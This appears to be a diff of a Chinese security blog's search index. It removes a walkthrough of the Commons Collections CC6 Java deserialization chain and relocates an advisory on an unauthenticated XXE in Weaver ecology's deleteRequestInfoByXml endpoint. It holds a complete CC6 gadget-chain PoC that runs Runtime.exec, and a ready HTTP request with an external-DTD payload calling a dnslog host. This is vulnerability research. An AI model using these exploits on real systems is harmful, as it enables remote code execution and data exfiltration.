-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
-                      class="" title="img"
-                > 
-
-<p>看到他的getValue函数，他是map.get(key)</p>
-<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
-<p>然后LazyMap调用get是不是就是上面的</p>
-<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
-<p>那如果key可控为Runtime.class呢</p>
-<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
-<p>就实现RCE了</p>
-<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
-                      class="" title="img"
-                > 
-
-<p>可以看出他可以序列化这个TiedMapEntry</p>
-<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
-<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
-                      class="" title="img"
-                > 
-
-<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
-<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>真的很简单写下来就会发现</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
-                      class="" title="img"
-                > 
-
-<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
-                      class="" title="img"
-                > 
-
-<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
-<p>也写一下代码吧</p>
-<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
-                      class="" title="img"
-                >
-
-<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
-<p>其实这里也可以想想入口怎么样很完美了</p>
-<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
-<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
-                      class="" title="img"
-                >
-
-<p>可以序列化和反序列化</p>
-<p>这里其实跟URL利用hashmap反序列化连起来了</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
-                      class="" title="img"
-                >
-
-<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
-                      class="" title="img"
-                >
-
-<p>直接就看到hashCode</p>
-<p>并且key.hashCode()，key还可控啊</p>
-<p>我们观察下他的反序列化readObject</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
-                      class="" title="img"
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
-                      class="" title="img"
-                > 
-
-<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
-<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
-</li>
-<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
-</li>
-<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
-</li>
-</ul>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
-                      class="" title="img"
-                > 
-
-<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
-                      class="" title="img"
-                > 
-
-<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
-<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
-<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
-<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
-                      class="" title="img"
-                > 
-
-<p>然后debug会调用toString</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
-                      class="" title="img"
-                > 
-
-<p>toString调用getValue</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
-                      class="" title="img"
-                > 
-
-<p>map是我们传入的LazyMap对象</p>
-<p>后一步是LazyMap的get(key)函数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
-                      class="" title="img"
-                > 
-
-<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
-                      class="" title="img"
-                > 
-
-<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
-                      class="" title="img"
-                > 
-
-<p>这就是我们要加上删除key的操作的原因</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
-                      class="" title="img"
-                > 
-
-<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
       <tags>
         <tag>反序列化</tag>
       </tags>
@@ -3383,6 +3383,35 @@
                       class="" title="image-20251229162749424"
                 > 
 
+<h2 id="先验和后验"><a href="#先验和后验" class="headerlink" title="先验和后验"></a>先验和后验</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229174704490.png"
+                      class="" title="image-20251229174704490"
+                > 
+
+<h3 id="先验公式"><a href="#先验公式" class="headerlink" title="先验公式"></a>先验公式</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229174753629.png"
+                      class="" title="image-20251229174753629"
+                > 
+
+<h3 id="后验公式"><a href="#后验公式" class="headerlink" title="后验公式"></a>后验公式</h3><p>计算条件概率然后取对数进行似然函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229174859930.png"
+                      class="" title="image-20251229174859930"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/27/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%92%8C%E6%8B%89%E6%99%AE%E6%8B%89%E6%96%AF%E5%B9%B3%E6%BB%91/image-20251229174913076.png"
+                      class="" title="image-20251229174913076"
+                > 
+
 <h2 id="拉普拉斯平滑"><a href="#拉普拉斯平滑" class="headerlink" title="拉普拉斯平滑"></a>拉普拉斯平滑</h2><p>当我们基于样本统计计算概率时，如果某个事件（如某个特征、某个 n-gram 组合）在训练集中<strong>从未出现过</strong>，其统计概率会为 0，这会导致：</p>
 <ul>
 <li>后续的概率乘积直接变为 0（比如朴素贝叶斯的后验概率计算）；</li>
@@ -3526,84 +3555,6 @@
       </tags>
   </entry>
   <entry>
-    <title>泛微deleteRequestInfoByXml接口xml注入漏洞</title>
-    <url>/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p><strong>&#x2F;rest&#x2F;ofs&#x2F;deleteRequestInfoByXml</strong> </p>
-<p><strong>发现泛微很多xxe的地方都会出现xmltomap，这跟到后面会调用SAXReader.read()造成xxe注入漏洞</strong> </p>
-<ul>
-<li>直接跟现有xmltomap存在漏洞的类，观察哪个函数调用了他，然后再往上找接口</li>
-<li>更sink一点，全局搜索SAXReader()实例化的地方，看看是否调用了.read()函数，以及是否有加一些防护手段。</li>
-</ul>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java"><a href="#classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java"></a>classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java</h2><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756083401-293a0c52-cec2-46bc-9657-18945fdc2fb3.png"
-                      class=""
-                > 
-
-<p>该接口调用了</p>
-<p>OfsTodoDataManagerNew.processDoneRequestByXml方法</p>
-<h2 id="classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java"><a href="#classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java"></a>classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java</h2><h3 id="processDoneRequestByXml"><a href="#processDoneRequestByXml" class="headerlink" title="processDoneRequestByXml"></a>processDoneRequestByXml</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756128087-a9a9a20c-8ec5-456d-a045-47f49c82a58f.png"
-                      class=""
-                > 
-
-<p>该方法会将xml格式文件转为map调用xmltomap函数 </p>
-<h3 id="xmlToMap"><a href="#xmlToMap" class="headerlink" title="xmlToMap"></a>xmlToMap</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756175124-69285341-d1e8-421b-96a5-5e3746ff7923.png"
-                      class=""
-                > 
-
-<p>该函数会将传入的参数进行parseText解析 </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756212187-37077b5f-604d-4413-891c-6407dac5eb91.png"
-                      class=""
-                > 
-
-<p><strong>重点是SAXReader这个类</strong>，初始化之后read即可造成xml注入漏洞</p>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>本地搭建的泛微ecology</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200843035.png"
-                      class="" title="image-20250312200843035"
-                > 
-
-<p>且是没有登录状态</p>
- <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200952922.png"
-                      class="" title="image-20250312200952922"
-                > 
-
-<p>数据包</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE syscode SYSTEM &quot;http://xxx.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;M&gt;&lt;syscode&gt;&amp;send;&lt;/syscode&gt;&lt;/M&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>dnslog结果</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312201055988.png"
-                      class="" title="image-20250312201055988"
-                > 
-
-]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>泛微</tag>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
     <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2><img  
@@ -3718,6 +3669,84 @@
       </categories>
       <tags>
         <tag>泛微</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>泛微deleteRequestInfoByXml接口xml注入漏洞</title>
+    <url>/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><strong>&#x2F;rest&#x2F;ofs&#x2F;deleteRequestInfoByXml</strong> </p>
+<p><strong>发现泛微很多xxe的地方都会出现xmltomap，这跟到后面会调用SAXReader.read()造成xxe注入漏洞</strong> </p>
+<ul>
+<li>直接跟现有xmltomap存在漏洞的类，观察哪个函数调用了他，然后再往上找接口</li>
+<li>更sink一点，全局搜索SAXReader()实例化的地方，看看是否调用了.read()函数，以及是否有加一些防护手段。</li>
+</ul>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java"><a href="#classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java"></a>classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756083401-293a0c52-cec2-46bc-9657-18945fdc2fb3.png"
+                      class=""
+                > 
+
+<p>该接口调用了</p>
+<p>OfsTodoDataManagerNew.processDoneRequestByXml方法</p>
+<h2 id="classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java"><a href="#classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java"></a>classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java</h2><h3 id="processDoneRequestByXml"><a href="#processDoneRequestByXml" class="headerlink" title="processDoneRequestByXml"></a>processDoneRequestByXml</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756128087-a9a9a20c-8ec5-456d-a045-47f49c82a58f.png"
+                      class=""
+                > 
+
+<p>该方法会将xml格式文件转为map调用xmltomap函数 </p>
+<h3 id="xmlToMap"><a href="#xmlToMap" class="headerlink" title="xmlToMap"></a>xmlToMap</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756175124-69285341-d1e8-421b-96a5-5e3746ff7923.png"
+                      class=""
+                > 
+
+<p>该函数会将传入的参数进行parseText解析 </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756212187-37077b5f-604d-4413-891c-6407dac5eb91.png"
+                      class=""
+                > 
+
+<p><strong>重点是SAXReader这个类</strong>，初始化之后read即可造成xml注入漏洞</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>本地搭建的泛微ecology</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200843035.png"
+                      class="" title="image-20250312200843035"
+                > 
+
+<p>且是没有登录状态</p>
+ <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200952922.png"
+                      class="" title="image-20250312200952922"
+                > 
+
+<p>数据包</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE syscode SYSTEM &quot;http://xxx.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;M&gt;&lt;syscode&gt;&amp;send;&lt;/syscode&gt;&lt;/M&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>dnslog结果</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312201055988.png"
+                      class="" title="image-20250312201055988"
+                > 
